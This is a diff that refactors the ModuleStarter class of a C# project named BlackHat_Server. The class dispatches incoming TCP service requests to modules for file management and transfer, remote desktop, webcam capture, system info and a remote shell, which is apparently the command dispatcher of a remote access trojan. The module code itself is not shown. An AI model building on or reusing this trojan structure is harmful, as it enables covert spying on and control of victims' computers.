@@ -1,82 +1,68 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Text;
-using System.Net.Sockets;
-
-namespace BlackHat_Server
+﻿namespace BlackHat_Server
 {
-    class ModuleStarter
+    internal class ModuleStarter
     {
         /// <summary>
-        /// Salvo il nuovo stream tra la lista stream in ST e avvio il thread FM
+        ///     Salvo il nuovo stream tra la lista stream in ST e avvio il thread FM
         /// </summary>
         /// <param name="servizio"></param>
         /// <param name="reqID"></param>
         public void StartSlotService(string servizio, string reqID)
         {
-            Connection con = new Connection();
+            var con = new Connection();
 
-            TcpClient ns = con.NewSlotRequest(servizio, reqID);
+            var ns = con.NewSlotRequest(servizio, reqID);
 
             ST_Client.Instance.nsListaCanali.Add(ns.GetStream());
 
             if (ns != null)
-            {
                 switch (servizio)
                 {
                     case "FILEMANAGER":
-                        FileManager fm = new FileManager(ns);
+                        var fm = new FileManager(ns);
                         fm.StartFMThread();
                         break;
 
                     case "IMAGESLOT":
-                        FileManager fmIm = new FileManager(ns);
+                        var fmIm = new FileManager(ns);
                         fmIm.StartIMThread();
                         break;
 
                     case "GALLERYSLOT":
-                        FileManager fmGl = new FileManager(ns);
+                        var fmGl = new FileManager(ns);
                         fmGl.StartGalleryThread();
                         break;
 
                     case "SEARCHSLOT":
-                        ListFiles lf = new ListFiles(ns.GetStream());
+                        var lf = new ListFiles(ns.GetStream());
                         lf.StrtListSearch();
                         break;
 
                     case "FILE_TRANSFER":
-                        FileManager fmFt = new FileManager(ns);
+                        var fmFt = new FileManager(ns);
                         fmFt.StartTransfThread();
                         break;
 
                     case "REMOTE_DESKTOP":
-                        DesktopAgent da = new DesktopAgent(ns.GetStream());
+                        var da = new DesktopAgent(ns.GetStream());
                         da.StartDesktopListener();
                         break;
 
                     case "WEBCAM_CAPTURE":
-                        WebCamAgent wa = new WebCamAgent(ns.GetStream());
-                        wa.StartWebCamListener();                        
+                        var wa = new WebCamAgent(ns.GetStream());
+                        wa.StartWebCamListener();
                         break;
 
                     case "SYSTEM_INFO":
-                        SystemAgent sa = new SystemAgent(ns.GetStream());
+                        var sa = new SystemAgent(ns.GetStream());
                         sa.StartSystemListener();
                         break;
 
                     case "REMOTE_SHELL":
-                        RemoteShellAgent rsa = new RemoteShellAgent(ns.GetStream());
+                        var rsa = new RemoteShellAgent(ns.GetStream());
                         rsa.StartShellListener();
                         break;
-
-                   
-
-                    default:
-                        break;
                 }
-                
-            }
-            
         }
         //----------------------------------------------------------------------
     }
